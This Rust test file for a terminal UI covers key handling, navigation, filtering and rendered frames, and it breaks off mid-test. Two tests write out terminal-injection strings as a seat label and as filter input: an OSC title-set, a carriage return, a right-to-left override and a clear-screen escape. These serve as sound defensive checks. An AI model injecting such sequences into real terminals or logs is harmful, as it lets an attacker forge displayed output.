//! The TUI's proofs, all headless: the pure state machine needs no
//! terminal, the draw path runs through `TestBackend` into a buffer, and
//! the shell runs over injected key and refresh sources.

use super::*;
use brokkr_core::fold::{Cursor, RunState, Status};
use brokkr_core::{EventEnvelope, EventType};
use brokkr_store::Store;
use ratatui::backend::TestBackend;
use ratatui::crossterm::event::{MouseEvent, MouseEventKind};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::path::Path;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Mutex;

const T0: &str = "2026-01-01T00:00:00Z";
const T1: &str = "2026-01-01T00:00:05Z";
const T2: &str = "2026-01-01T00:02:03Z";
const NOW: &str = "2026-01-01T00:07:03Z";

// -------------------------------------------------------------- fixtures

fn ev(seq: u64, event_type: EventType, payload: Value, at: &str) -> EventEnvelope {
    EventEnvelope {
        run_id: "run-7".to_string(),
        seq,
        event_id: format!("ev{seq}"),
        event_schema_version: 1,
        event_type,
        payload,
        causation_id: None,
        correlation_id: "corr".to_string(),
        attempt_id: None,
        recorded_at: at.to_string(),
        previous_hash: String::new(),
        event_hash: String::new(),
    }
}

fn state() -> RunState {
    state_of(Status::Running)
}

fn state_of(status: Status) -> RunState {
    RunState {
        run_id: "run-7".to_string(),
        seq: 18,
        last_hash: "hash".to_string(),
        status,
        phase: Some("design".to_string()),
        cursor: Cursor::Idle,
        consecutive_failures: BTreeMap::new(),
        visits: BTreeMap::new(),
        last_result: None,
        last_decision: Some(json!({"rule_id": "INTAKE-OK", "from": "intake",
                                   "next": "design", "result": "intook"})),
        reviewed_heads: None,
        park_reason: None,
        feature: Some("one derivation, three surfaces".to_string()),
        pending_command: None,
        riding_stop: false,
    }
}

/// An intake seat that concluded, then a design sequence: a forked step
/// with two members, a one-member step, and a bare member still working.
/// Every shape the graph draws, in one run.
fn journal(seat: &str) -> Vec<EventEnvelope> {
    let mut events = vec![
        ev(
            1,
            EventType::RunStarted,
            json!({"feature": "one derivation, three surfaces"}),
            T0,
        ),
        ev(2, EventType::PhaseEntered, json!({"phase": "intake"}), T0),
        ev(
            3,
            EventType::EffectRequested,
            json!({"effect_id": "eff-i", "seat": seat, "phase": "intake"}),
            T0,
        ),
        ev(
            4,
            EventType::EffectStarted,
            json!({"effect_id": "eff-i", "attempt_id": "att1"}),
            T0,
        ),
        ev(
            5,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-i", "attempt_id": "att1",
                   "checkpoint": {"step": "seat-turn", "turn": 3, "tool": "Read",
                                  "target": "docs/decisions/0014-interactive-tui.md"}}),
            T0,
        ),
        ev(
            6,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-i", "attempt_id": "att1",
                   "checkpoint": {"step": "claude-session-finished",
                                  "transcript": {"kind": "claude-session",
                                    "locator": "abcd-1234",
                                    "home": "/home/operator/.claude/projects"},
                                  "total_cost_usd": 0.03125}}),
            T1,
        ),
        ev(
            7,
            EventType::EffectSucceeded,
            json!({"effect_id": "eff-i", "attempt_id": "att1",
                   "result": {"result": "intook"}}),
            T2,
        ),
        ev(
            8,
            EventType::TransitionDecided,
            json!({"rule_id": "INTAKE-OK", "severity": "normal", "from": "intake",
                   "next": "design", "result": "intook"}),
            T2,
        ),
        ev(9, EventType::PhaseEntered, json!({"phase": "design"}), T2),
        ev(
            10,
            EventType::EffectRequested,
            json!({"effect_id": "eff-d", "seat": "design", "phase": "design"}),
            T2,
        ),
        ev(
            11,
            EventType::EffectStarted,
            json!({"effect_id": "eff-d", "attempt_id": "att2"}),
            T2,
        ),
    ];
    for (seq, member) in [(12, "positions:simplicity"), (13, "positions:robustness")] {
        events.push(ev(
            seq,
            EventType::EffectCheckpointed,
            json!({"effect_id": "eff-d", "attempt_id": "att2",
                   "checkpoint": {"member": member, "step": "panel-member-finished",
                                  "outcome": "succeeded"}}),
            T2,
        ));
    }
    events.push(ev(
        14,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"step": "sequence-step-finished", "step_name": "positions"}}),
        T2,
    ));
    events.push(ev(
        15,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"member": "review:only", "step": "panel-member-finished",
                              "outcome": "succeeded"}}),
        T2,
    ));
    events.push(ev(
        16,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"step": "sequence-step-finished", "step_name": "review"}}),
        T2,
    ));
    events.push(ev(
        17,
        EventType::EffectCheckpointed,
        json!({"effect_id": "eff-d", "attempt_id": "att2",
               "checkpoint": {"member": "chief", "step": "seat-turn", "turn": 2,
                              "tool": "Write", "target": "specs/interactive-tui/spec.md"}}),
        T2,
    ));
    events
}

fn run_view_for(seat: &str) -> RunView {
    brokkr_view::run_view(&journal(seat), Some(&state()))
}

/// Two runs plus one whose journal does not fold and whose stamp does
/// not parse: the absence marks have a row to live in.
fn fleet() -> RunsView {
    let folded = state();
    let entries = [
        brokkr_view::RunEntry {
            run_id: "run-unfoldable",
            feature: "a run whose journal does not fold",
            created_at: "not a timestamp",
            state: None,
            detail: None,
        },
        brokkr_view::RunEntry {
            run_id: "run-old",
            feature: "an older feature",
            created_at: T0,
            state: Some(&folded),
            detail: None,
        },
        brokkr_view::RunEntry {
            run_id: "run-7",
            feature: "one derivation, three surfaces",
            created_at: T1,
            state: Some(&folded),
            detail: None,
        },
    ];
    brokkr_view::run_rows(&entries)
}

fn views_with(seat: &str) -> Views {
    Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(run_view_for(seat)),
        transcript: None,
        note: None,
    }
}

fn views() -> Views {
    views_with("intake")
}

/// A transcript of `count` prose turns, each naming its own index — so
/// "the SAME turn" is askable by text, not just by position.
fn turns_of(count: usize) -> Vec<crate::ui::Turn> {
    (0..count)
        .map(|index| crate::ui::Turn {
            role: format!("turn {index}"),
            ts: T1.to_string(),
            blocks: vec![crate::ui::Block {
                kind: "text",
                text: format!("prose of turn {index}"),
            }],
        })
        .collect()
}

/// The RUN level for `run-7`, as `Enter` on the fleet leaves it.
fn at_run() -> Tui {
    let mut tui = Tui::new(None);
    tui.cursor[0] = Some("run-7".to_string());
    let views = views();
    apply(&mut tui, &views, Key::Enter);
    tui
}

/// The RUN level with the seats pane focused and a seat under the
/// cursor.
fn at_seats(key: &str) -> Tui {
    let mut tui = at_run();
    tui.pane = 1;
    tui.cursor[1] = Some(key.to_string());
    tui
}

fn buffer_of(tui: &Tui, views: &Views, width: u16, height: u16) -> Vec<String> {
    let mut terminal = Terminal::new(TestBackend::new(width, height)).unwrap();
    terminal.draw(|frame| draw(frame, tui, views)).unwrap();
    let buffer = terminal.backend().buffer().clone();
    let mut lines = Vec::new();
    for row in 0..buffer.area.height {
        let mut line = String::new();
        for column in 0..buffer.area.width {
            line.push_str(buffer[(column, row)].symbol());
        }
        lines.push(line);
    }
    lines
}

fn frame_of(tui: &Tui, views: &Views, width: u16, height: u16) -> String {
    buffer_of(tui, views, width, height).join("\n")
}

/// The characters of one buffer line from column `x` — how "the
/// neighbouring column starts at its expected x" is asked.
fn at(line: &str, x: usize) -> String {
    line.chars().skip(x).collect()
}

// -------------------------------------------------- AC-14: key translation

#[test]
fn key_translation_filters_releases_binds_ctrl_c_and_names_what_it_ignores() {
    let pressed = |code| Event::Key(KeyEvent::new(code, KeyModifiers::NONE));
    assert_eq!(from_crossterm(pressed(KeyCode::Up)), Some(Key::Up));
    assert_eq!(from_crossterm(pressed(KeyCode::Down)), Some(Key::Down));
    assert_eq!(from_crossterm(pressed(KeyCode::Left)), Some(Key::Left));
    assert_eq!(from_crossterm(pressed(KeyCode::Right)), Some(Key::Right));
    assert_eq!(from_crossterm(pressed(KeyCode::PageUp)), Some(Key::PageUp));
    assert_eq!(
        from_crossterm(pressed(KeyCode::PageDown)),
        Some(Key::PageDown)
    );
    assert_eq!(from_crossterm(pressed(KeyCode::Tab)), Some(Key::Tab));
    assert_eq!(from_crossterm(pressed(KeyCode::BackTab)), Some(Key::Tab));
    assert_eq!(from_crossterm(pressed(KeyCode::Enter)), Some(Key::Enter));
    assert_eq!(from_crossterm(pressed(KeyCode::Esc)), Some(Key::Escape));
    assert_eq!(
        from_crossterm(pressed(KeyCode::Backspace)),
        Some(Key::Backspace)
    );
    assert_eq!(
        from_crossterm(pressed(KeyCode::Char('j'))),
        Some(Key::Char('j'))
    );
    assert_eq!(from_crossterm(pressed(KeyCode::Home)), None, "unbound");

    // Raw mode disables SIGINT, so an operator whose draw path wedges
    // must still have a way out.
    assert_eq!(
        from_crossterm(Event::Key(KeyEvent::new(
            KeyCode::Char('c'),
            KeyModifiers::CONTROL
        ))),
        Some(Key::Quit)
    );

    // Windows delivers key RELEASES too: a handler matching on KeyCode
    // alone would process every keystroke twice on that CI leg.
    let mut release = KeyEvent::new(KeyCode::Char('q'), KeyModifiers::NONE);
    release.kind = KeyEventKind::Release;
    assert_eq!(from_crossterm(Event::Key(release)), None);

    // Ignored by named arms, never by an untested wildcard.
    assert_eq!(
        from_crossterm(Event::Mouse(MouseEvent {
            kind: MouseEventKind::Moved,
            column: 1,
            row: 1,
            modifiers: KeyModifiers::NONE,
        })),
        None
    );
    assert_eq!(from_crossterm(Event::Paste("pasted".into())), None);
    assert_eq!(from_crossterm(Event::FocusGained), None);
    assert_eq!(from_crossterm(Event::FocusLost), None);
    assert_eq!(from_crossterm(Event::Resize(10, 10)), None);
}

// ------------------------------------------------------ AC-7: movement

#[test]
fn movement_wraps_pages_and_forgets_a_vanished_key() {
    let keys: Vec<String> = ["a", "b", "c"].iter().map(|k| k.to_string()).collect();
    let mut cursor = None;

    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(
        cursor.as_deref(),
        Some("a"),
        "no selection starts at the top"
    );
    move_to(&keys, &mut cursor, Step::Up);
    assert_eq!(cursor.as_deref(), Some("c"), "wraps at the top end");
    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(cursor.as_deref(), Some("a"), "wraps at the bottom end");
    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(cursor.as_deref(), Some("b"));
    move_to(&keys, &mut cursor, Step::Up);
    assert_eq!(cursor.as_deref(), Some("a"));
    move_to(&keys, &mut cursor, Step::Bottom);
    assert_eq!(cursor.as_deref(), Some("c"));
    move_to(&keys, &mut cursor, Step::Top);
    assert_eq!(cursor.as_deref(), Some("a"));
    move_to(&keys, &mut cursor, Step::PageDown);
    assert_eq!(cursor.as_deref(), Some("c"), "paging stops at the end");
    move_to(&keys, &mut cursor, Step::PageUp);
    assert_eq!(cursor.as_deref(), Some("a"), "and at the start");

    // The subject vanished across a refresh, or the filter excluded it:
    // movement restarts from the top, and `G` still reaches the bottom.
    cursor = Some("gone".to_string());
    assert_eq!(index_of(&keys, &cursor), None);
    move_to(&keys, &mut cursor, Step::Down);
    assert_eq!(cursor.as_deref(), Some("a"));
    cursor = Some("gone".to_string());
    move_to(&keys, &mut cursor, Step::Bottom);
    assert_eq!(cursor.as_deref(), Some("c"));

    // An empty list holds no selection at all.
    let mut cursor = Some("a".to_string());
    move_to(&[], &mut cursor, Step::Down);
    assert_eq!(cursor, None);
    assert_eq!(index_of(&keys, &None), None);
}

// ------------------------------------------ AC-4, AC-5: the Enter/Esc ladder

#[test]
fn enter_descends_one_rung_at_a_time_and_esc_pops_the_same_rungs() {
    let views = views();
    let mut tui = Tui::new(None);
    assert_eq!(tui.level, Level::Runs);

    // Rung 1: RUNS, cursor on a run.
    assert_eq!(apply(&mut tui, &views, Key::Enter), Flow::Continue);
    assert_eq!(tui.run, None, "no selection descends into nothing");
    apply(&mut tui, &views, Key::Down);
    assert_eq!(tui.cursor[0].as_deref(), Some("run-7"), "newest first");
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.run.as_deref(), Some("run-7"));
    assert_eq!(tui.pane, 0);

    // A pane with no selected row is not a door. This is a normal first
    // frame, before the operator has moved the cursor onto a graph node.
    apply(&mut tui, &views, Key::Enter);
    assert!(tui.scope.is_none(), "no selection descends into nothing");

    // Rung 2: RUN · graph → a phase scope. The graph's rail moves on
    // `j`/`k` (and on `←→`); `↑↓` there walk the lanes inside a phase.
    apply(&mut tui, &views, Key::Char('j'));
    apply(&mut tui, &views, Key::Enter);
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "intake"),
        "the graph pane scopes by phase"
    );

    // Rung 3: RUN · seats, an unscoped seat → a seat scope.
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.scope.is_none(), "Esc rung 4 clears the scope");
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 1);
    apply(&mut tui, &views, Key::Down);
    let seat = tui.cursor[1].clone().unwrap();
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(scoped_seat(&tui), Some(seat.as_str()));
    assert_eq!(tui.level, Level::Run, "one rung, not two");

    // Rung 4: the SAME seat again → descend.
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    assert_eq!(tui.seat.as_deref(), Some(seat.as_str()));

    // Rung 3 of Esc: back to the seat you were reading, scope retained.
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.seat, None);
    assert_eq!(tui.pane, 1, "landed back on the seats pane");
    assert_eq!(scoped_seat(&tui), Some(seat.as_str()), "scope retained");

    // Rungs 4 and 5, then rung 6: Esc NEVER quits.
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.scope.is_none());
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Runs);
    assert_eq!(apply(&mut tui, &views, Key::Escape), Flow::Continue);
    assert_eq!(tui.level, Level::Runs, "the bottom rung does nothing");

    // The ladder does not care which VARIANT the scope is, so a seat
    // the LANE cursor scoped pops exactly like a phase the rail did:
    // one press clears, the next ascends.
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Right);
    apply(&mut tui, &views, Key::Down);
    assert!(scoped_seat(&tui).is_some(), "the lane cursor scoped a seat");
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.scope.is_none(), "rung 4 clears a lane-set scope too");
    assert_eq!(tui.level, Level::Run, "one rung, not two");
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Runs, "and the next press ascends");
}

#[test]
fn backspace_ascends_by_rungs_three_and_five_and_never_clears_a_scope() {
    let views = views();
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);

    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(
        scoped_seat(&tui),
        Some("eff-i"),
        "ascending never clears a scope"
    );
    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.level, Level::Runs, "rung 5, with the scope untouched");
    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.level, Level::Runs);
}

#[test]
fn the_run_flag_opens_at_the_run_level_and_esc_walks_to_the_fleet() {
    let views = views();
    let mut tui = Tui::new(Some("run-7".to_string()));
    assert_eq!(tui.level, Level::Run, "--run opens at its run");
    apply(&mut tui, &views, Key::Escape);
    assert_eq!(tui.level, Level::Runs, "and Esc reaches the full fleet");
    assert_eq!(tui.run.as_deref(), Some("run-7"));
}

#[test]
fn tab_cycles_the_panes_a_level_has_and_a_new_run_clears_every_selection() {
    let views = views();
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 0, "one pane at RUNS: a visible no-op");

    let mut tui = at_run();
    for expected in [1, 2, 0] {
        apply(&mut tui, &views, Key::Tab);
        assert_eq!(tui.pane, expected);
    }

    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 1);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 0, "two panes at PARTICIPANT");

    // Assigning a run clears scope, seat, filter and every cursor.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    tui.filter = "run".to_string();
    tui.level = Level::Runs;
    tui.pane = 0;
    tui.cursor[0] = Some("run-old".to_string());
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.run.as_deref(), Some("run-old"));
    assert!(tui.scope.is_none() && tui.seat.is_none());
    assert!(tui.filter.is_empty() && !tui.typing);
    assert_eq!(tui.cursor, [None, None, None]);
}

// ------------------------------------------------ AC-6, AC-11: filtering

#[test]
fn a_filter_narrows_the_focused_list_incrementally_and_never_clears_a_scope() {
    let views = views();
    let mut tui = at_run();
    assert_eq!(keys_for(&tui, &views).len(), 2, "two phases");

    apply(&mut tui, &views, Key::Char('/'));
    assert!(tui.typing);
    for (character, expected) in [('d', 1), ('e', 1), ('z', 0)] {
        apply(&mut tui, &views, Key::Char(character));
        assert_eq!(
            keys_for(&tui, &views).len(),
            expected,
            "filter {:?} narrows as it is typed",
            tui.filter
        );
    }
    apply(&mut tui, &views, Key::Backspace);
    assert_eq!(tui.filter, "de", "Backspace deletes one character");
    assert_eq!(keys_for(&tui, &views).len(), 1);
    apply(&mut tui, &views, Key::Enter);
    assert!(!tui.typing, "Enter commits the filter");
    assert_eq!(tui.filter, "de", "and keeps it");
    apply(&mut tui, &views, Key::Escape);
    assert!(tui.filter.is_empty(), "Esc clears the filter");
    assert_eq!(tui.level, Level::Run, "clearing a filter is not ascending");

    // A filter that hides the scoped subject leaves the scope intact:
    // absence from a FILTERED list is a display fact, and only absence
    // from the unfiltered model is the vanish condition.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    assert!(tui.scope.is_some());
    apply(&mut tui, &views, Key::Char('/'));
    apply(&mut tui, &views, Key::Char('z'));
    settle(&mut tui, &views);
    assert!(keys_for(&tui, &views).is_empty(), "nothing matches");
    assert_eq!(scoped_seat(&tui), Some("eff-i"), "the scope survives");

    // Operator input is sanitized before it is echoed anywhere.
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Char('/'));
    for character in "a\x1b[2Jb\r".chars() {
        apply(&mut tui, &views, Key::Char(character));
    }
    assert_eq!(tui.filter, "a[2Jb", "a pasted escape sequence is inert");
    assert!(!footer_for(&tui, &views).contains('\x1b'));
}

// ------------------------------------------- AC-6, AC-7: scoping and vanish

#[test]
fn a_second_selection_replaces_the_first_and_a_vanished_subject_clears_itself() {
    let views = views();
    let mut tui = at_run();
    apply(&mut tui, &views, Key::Char('j'));
    apply(&mut tui, &views, Key::Enter);
    assert!(matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "intake"));
    // The graph pane lists every phase whether or not one is scoped —
    // a selector that hid the alternatives could never replace a scope.
    apply(&mut tui, &views, Key::Char('j'));
    apply(&mut tui, &views, Key::Enter);
    assert!(
        matches!(&tui.scope, Some(render::Scope::Phase(name)) if name == "design"),
        "exclusivity is one Option field, not a rule: {:?}",
        tui.cursor
    );

    // Selection SURVIVES a refresh that changes the list: the same
    // state, applied against a second, longer RunView, still resolves.
    let mut grown = views_with("intake");
    grown.runs = fleet();
    settle(&mut tui, &grown);
    assert!(tui.scope.is_some(), "the phase is still there");
    assert_eq!(selected(&tui, &grown).as_deref(), Some("design"));

    // And CLEARS ITSELF when the subject vanishes from the unfiltered
    // model — here, a run whose journal holds no such phase.
    let empty = Views {
        now: NOW.to_string(),
        runs: fleet(),
        run: Some(brokkr_view::run_view(&[], None)),
        transcript: None,
        note: None,
    };
    settle(&mut tui, &empty);
    assert!(tui.scope.is_none(), "the phase went away");
    assert_eq!(selected(&tui, &empty), None);

    // A seat that vanishes takes the PARTICIPANT level with it.
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    settle(&mut tui, &views);
    assert_eq!(tui.level, Level::Participant, "still there, still open");
    settle(&mut tui, &empty);
    assert_eq!(tui.level, Level::Run);
    assert_eq!(tui.seat, None);

    // A run that vanishes from a NON-EMPTY fleet clears the selection;
    // an empty fleet is the unreadable-journal frame and proves nothing.
    let mut tui = at_run();
    settle(&mut tui, &Views::empty());
    assert_eq!(tui.run.as_deref(), Some("run-7"), "no fleet, no evidence");
    let others = Views {
        now: NOW.to_string(),
        runs: brokkr_view::run_rows(&[brokkr_view::RunEntry {
            run_id: "run-other",
            feature: "another run",
            created_at: T0,
            state: None,
            detail: None,
        }]),
        run: None,
        transcript: None,
        note: None,
    };
    settle(&mut tui, &others);
    assert_eq!(tui.run, None);
    assert_eq!(tui.level, Level::Runs);
}

// -------------------------------------------------------- AC-8: the footer

#[test]
fn the_footer_names_the_keys_of_the_context_it_is_in() {
    let views = views();
    let mut states: Vec<String> = Vec::new();

    let tui = Tui::new(None);
    states.push(footer_for(&tui, &views));
    assert!(states[0].contains("Enter open run"), "{}", states[0]);

    let mut tui = at_run();
    states.push(footer_for(&tui, &views));
    assert!(states[1].contains("Enter scope phase"));
    // The graph is the one pane whose primary axis is horizontal, and
    // the footer is where an operator finds that out.
    assert!(states[1].contains("←→ rail"), "{}", states[1]);
    assert!(states[1].contains("↑↓ lanes"), "{}", states[1]);

    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &views, Key::Down);
    states.push(footer_for(&tui, &views));
    assert!(states[2].contains("Enter scope seat"), "{}", states[2]);

    apply(&mut tui, &views, Key::Enter);
    states.push(footer_for(&tui, &views));
    assert!(
        states[3].contains("Enter open seat"),
        "an already-scoped seat opens: {}",
        states[3]
    );

    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 2, "the trail");
    states.push(footer_for(&tui, &views));
    assert!(states[4].contains("Tab pane"));

    // The footer fails closed if a future pane is introduced before it
    // receives an Enter action: do not advertise opening the trail.
    tui.pane = 3;
    let unknown_footer = footer_for(&tui, &views);
    assert!(
        !unknown_footer.contains("Enter read row"),
        "{unknown_footer}"
    );
    tui.pane = 2;

    apply(&mut tui, &views, Key::Tab);
    apply(&mut tui, &views, Key::Tab);
    assert_eq!(tui.pane, 1, "back on the scoped seat");
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);
    states.push(footer_for(&tui, &views));
    assert!(states[5].contains("scroll"), "{}", states[5]);

    // The transcript pane names its readerS — decision 0014's
    // discoverability rule — where the checkpoint pane does not. Two
    // doors, so the footer says which one Enter is, and names the key
    // back to the other.
    apply(&mut tui, &views, Key::Tab);
    states.push(footer_for(&tui, &views));
    assert!(
        states[6].contains("Enter read whole transcript"),
        "no turn selected, so Enter is the whole-transcript door: {}",
        states[6]
    );
    let mut transcript = views_with("intake");
    transcript.transcript = Some((turns_of(2), false));
    apply(&mut tui, &transcript, Key::Down);
    let selected_footer = footer_for(&tui, &views);
    assert!(
        selected_footer.contains("Enter read turn"),
        "a selected turn makes Enter the per-turn door: {selected_footer}"
    );
    assert!(
        selected_footer.contains("Esc unselect"),
        "and the way back to the whole transcript is named: {selected_footer}"
    );
    apply(&mut tui, &transcript, Key::Escape);
    apply(&mut tui, &views, Key::Tab);

    apply(&mut tui, &views, Key::Char('/'));
    states.push(footer_for(&tui, &views));
    assert!(states[7].starts_with('/'));

    apply(&mut tui, &views, Key::Escape);
    apply(&mut tui, &views, Key::Char('?'));
    states.push(footer_for(&tui, &views));
    assert!(states[8].contains("close help"));

    // Every context differs from every other: a footer that always
    // printed the same string could not pass this.
    for (index, state) in states.iter().enumerate() {
        for (other_index, other) in states.iter().enumerate() {
            assert!(
                index == other_index || state != other,
                "contexts {index} and {other_index} share a footer: {state}"
            );
        }
        // While a filter is being typed, `q` is a letter — so that
        // context names what it does have instead.
        assert!(
            state.contains("quit") || state.starts_with('/'),
            "every context names its way out: {state}"
        );
    }
}

#[test]
fn the_status_line_is_the_breadcrumb_or_the_sentence_a_bad_journal_earns() {
    let views = views();
    let tui = Tui::new(None);
    assert_eq!(status_line(&tui), "runs");

    let mut tui = at_seats("eff-i");
    assert!(status_line(&tui).contains("run run-7"));
    apply(&mut tui, &views, Key::Enter);
    assert!(status_line(&tui).contains("scoped eff-i"));
    apply(&mut tui, &views, Key::Enter);
    assert!(status_line(&tui).contains("seat eff-i"));

    let mut tui = at_run();
    apply(&mut tui, &views, Key::Char('j'));
    apply(&mut tui, &views, Key::Enter);
    assert!(status_line(&tui).contains("phase intake"));

    tui.status = Some("the journal is not readable right now: locked".to_string());
    assert!(status_line(&tui).contains("not readable"));
}

// ------------------------------------------ AC-3, AC-10, AC-11: the paint

#[test]
fn the_runs_table_is_a_bordered_navigable_table_of_model_fields() {
    let views = views();
    let mut tui = Tui::new(None);
    apply(&mut tui, &views, Key::Down);
    let frame = frame_of(&tui, &views, 100, 20);

    assert!(frame.contains("┌"), "bordered: {frame}");
    for column in ["id", "status", "phase", "seq", "age", "feature"] {
        assert!(frame.contains(column), "header names {column}: {frame}");
    }
    assert!(frame.contains("run-7"));
    assert!(frame.contains("running"));
    assert!(frame.contains("design"));
    assert!(frame.contains("7m03s"), "age is the model's: {frame}");
    assert!(frame.contains("one derivation"));
    // A run whose journal does not fold KEEPS ITS ROW, with the absence
    // marks the models carry rather than a guessed status.
    assert!(frame.contains("run-unfoldable"), "{frame}");
    assert!(frame.contains('?') && frame.contains('—'), "{frame}");
    // The footer names this context's keys, in the frame itself.
    assert!(frame.contains("Enter open run"), "{frame}");
}

#[test]
fn the_run_level_draws_the_graph_the_seats_and_the_trail() {
    let mut views = views();
    let reported = views
        .run
        .as_mut()
        .unwrap()
        .journal
        .iter_mut()
        .find(|row| row.in_trail)
        .unwrap();
    reported.model = brokkr_view::Cell {
        text: "claude-fable-5-1".to_string(),
        absent: false,
        note: None,
    };
    let mut tui = at_run();
    tui.pane = 2;
    let frame = frame_of(&tui, &views, 110, 30);

    // The console's grammar: one rail, arrowed steps, a fork that
    // rejoins, and the phase names on one shared baseline.
    assert!(frame.contains("──ᐳ"), "an arrowed edge: {frame}");
    assert!(
        frame.contains('┤') && frame.contains('├'),
        "a fork: {frame}"
    );
    assert!(frame.contains('┌') && frame.contains('┘'), "lanes: {frame}");
    assert!(frame.contains("simplicity"), "a member label: {frame}");
    assert!(frame.contains("positions"), "the step's own name: {frame}");
    assert!(
        frame.contains("intake") && frame.contains("design"),
        "{frame}"
    );
    // `×N` is the console's rule: nothing at all for a single visit.
    assert!(!frame.contains('×'), "no ×1 on a first visit: {frame}");

    // The seats table: six columns of model fields.
    for column in [
        "participant",
        "status",
        "attempts",
        "turns",
        "cost",
        "activity",
    ] {
        assert!(frame.contains(column), "header names {column}: {frame}");
    }
    assert!(frame.contains("succeeded"), "a concluded seat: {frame}");
    assert!(frame.contains("intook"), "activity.text: {frame}");
    assert!(frame.contains("$0.03"), "the cost cell: {frame}");
    // A working seat shows its live tool and target — the model's own
    // composition of `activity.tool` and `activity.target_short`.
    assert!(
        frame.contains("Write · …/interactive-tui/spec.md") || frame.contains("Write · "),
        "{frame}"
    );

    // The decision trail.
    assert!(frame.contains("INTAKE-OK"), "{frame}");
    assert!(frame.contains("transition/decided"), "{frame}");
    assert!(frame.contains("model claude-fable-5-1"), "{frame}");
}

#[test]
fn a_hostile_seat_label_renders_inert_and_does_not_move_its_neighbour() {
    // A seat label carrying an OSC title-set, a carriage return and a
    // RIGHT-TO-LEFT OVERRIDE: three ways to forge a ruling line.
    let views = views_with("seat\x1b]0;pwn\x07\rdeppots\u{202E}");
    let mut tui = at_run();
    tui.pane = 1;
    let lines = buffer_of(&tui, &views, 110, 30);
    let frame = lines.join("\n");

    assert!(!frame.contains('\x1b'), "no escape reaches the buffer");
    assert!(!frame.contains('\r'), "no carriage return either");
    assert!(!frame.contains('\u{202E}'), "and no reordering override");
    assert!(
        frame.contains("seat]0;pwndeppots"),
        "in source order: {frame}"
    );

    // The width half of the claim: the neighbouring column still starts
    // where the header says it does.
    let head = lines
        .iter()
        .position(|line| line.contains("participant"))
        .expect("the seats header is drawn");
    // Columns are counted in characters, not bytes: the border glyphs
    // are three bytes each and the claim is about where a column
    // *appears*.
    let byte = lines[head].find("status").expect("a status column");
    let x = lines[head][..byte].chars().count();
    let row = lines[head..]
        .iter()
        .find(|line| line.contains("seat]0;pwn"))
        .expect("the hostile row is drawn");
    assert!(
        at(row, x).starts_with("succeeded"),
        "the status column starts at x={x}: {row:?}"
    );
}

#[test]
fn the_participant_level_shows_the_stream_the_resume_line_and_the_transcript() {
    let mut views = views();
    let mut tui = at_seats("eff-i");
    apply(&mut tui, &views, Key::Enter);
    apply(&mut tui, &views, Key::Enter);
    assert_eq!(tui.level, Level::Participant);

    // No local transcript: the pane says so, and the resume line is
    // still there — it is the escape hatch that always exists.
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("transcript  claude-session"), "{frame}");
    assert!(frame.contains("claude --resume abcd-1234"), "{frame}");
    assert!(frame.contains("no local session transcript"), "{frame}");
    assert!(frame.contains("effect/succeeded"), "terminal_line: {frame}");
    assert!(frame.contains("Read"), "the checkpoint stream: {frame}");

    // With one: prose and tool markers, and the truncation flag SHOWN.
    views.transcript = Some((
        vec![crate::ui::Turn {
            role: "assistant".to_string(),
            ts: T1.to_string(),
            blocks: vec![crate::ui::Block {
                kind: "text",
                text: "the seat's own words".to_string(),
            }],
        }],
        true,
    ));
    let frame = frame_of(&tui, &views, 100, 26);
    assert!(frame.contains("the seat's own words"), "{frame}");
    assert!(frame.contains("transcript truncated"), "{frame}");

    // A seat with no transcript still gets the common plain label.
    let views = views_with("intake");
    let mut tui = at_seats("eff-d");
